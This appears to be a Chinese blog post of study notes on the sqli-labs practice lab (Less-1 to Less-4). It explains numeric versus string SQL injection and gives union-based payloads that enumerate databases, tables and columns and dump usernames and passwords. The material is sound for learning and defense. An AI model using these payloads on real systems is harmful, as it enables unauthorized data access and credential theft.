---
layout:    post
title:     sqli-labs
subtitle:  学习学习
date:      2020-10-23
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tage:
    - 学习
---

####  一、SQL注入类型判断（前提了解）

        数字型注入
        字符型注入
1.数字型：输入 id=1 and 1=1 和 1=2进行判断，首先在URL中输入？id=1 and 1=1 页面显示正常，后输入id=1 and 1=2 页面出错，说明注入类型为数字型。<br>

原因如下：当输入 and 1=1时，后台执行sql语句：<br>

select*from <> where id = 1 and 1=1;<br>

没有语法错误且逻辑判断正确，返回正常。<br>

当输入 and 1=2时，后台执行sql语句：<br>

select*from <> where id = 1 and 1=2;<br>

没有语法错误，但逻辑判断为假，所以返回错误。<br>

若为字符型输入上述语句，后台执行sql语句：<br>

select*from <> where id ='1 and 1=1';<br>

select*from <> where id = '1 and 1=2';<br>

查询语句将and语句全部转换为字符串，不会进行逻辑判断，所以不会显示错误。<br>

2.字符型：输入 and '1'='1 和 and '1'='2来判断. 。当输入and '1'='1时页面正常，输入 and '1'='2后错误，说明注入类型为字符型。<br>

原因如下：当输入 and '1'='1时，sql语句为：<br>

select*from <> where id = 'x' and '1'='1'; <br>

没有语法错误且逻辑判断正确，返回正常。<br>

当输入 and '1'='2时，sql语句为：<br>

select*from <> where id = 'x' and '1'='2'; <br>

没有语法错误，但逻辑判断为假，所以返回错误。<br>

#### Less-1

​    1.使用hackbar,首先输入id= 1,显示正常，接着输入id=1 and 1=2判断是否为数字型注入，发现不是。

​    2.输入id=1' 显示错误，说明为字符型注入。

​    3.用--+注释掉后面的’，输入id=1' order by x --+ （x=1,2,3,4）,判断字段，发现有3个字段。

​	4.id=-1' union select 1,2,3 --+，判断回显（要让系统使用联合查询，要使前面id错误（如id=-1等错误id）来进行后面的查询语句）。回显位为2，3位。

​	5.id=-1' union select 1,database(),3 --+,查询数据库名称。

​	6.id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 --+,得到表名。

​	7.id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+,得到列名。

​	8.id=-1' union select 1,(select group_concat(username,password) from security.users),3 --+,成功。

#### Less-2

​	1.判断注入，输入id=1 and 1=2，报错，数字型注入。

​	2.步骤同Less-1。

#### Less-3

​	1.判断注入，发现是基于 ') 的字符注入。id=1') --+。

​	2.步骤同Less-1。

#### Less-4

​	1.判断注入，为基于 ") 的字符注入。 id=1") --+。

​	2.步骤同Less-1。

​	